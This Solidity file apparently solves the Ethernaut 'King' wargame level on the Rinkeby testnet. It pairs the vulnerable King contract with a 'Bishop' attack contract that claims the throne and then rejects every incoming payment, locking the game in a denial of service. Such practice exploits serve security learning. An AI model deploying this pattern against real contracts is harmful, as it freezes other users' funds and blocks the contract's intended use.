// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    //0xF7B7C73346c5BA4545488ff35dEB2680F3913B91 Rinkeby
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract Bishop {
    //0x7A40ad6baF939f63037b30A16a4dd55d2aDC1Df0 Rinkeby
    string constant THANKS = "Thank you!";

    function ovethrow(address payable kingAddr, uint256 gasAmount) public {
        King k = King(kingAddr);
        uint256 prize = k.prize();
        require(address(this).balance >= prize, "Not Enough Eth. Fund Army!");
        // Calling fallback/receive function with 2300 gas limit
        (bool sent, ) = kingAddr.call{
            gas: gasAmount,
            value: address(this).balance
        }("");
        require(sent, "Failed! Eth not sent");
    }

    fallback() external payable {
        require(0 > 1, "I'm the only king!");
    }

    receive() external payable {
        require(0 > 1, "I'm the only king!");
    }

    function fundArmy() public payable returns (string memory) {
        return THANKS;
    }
}
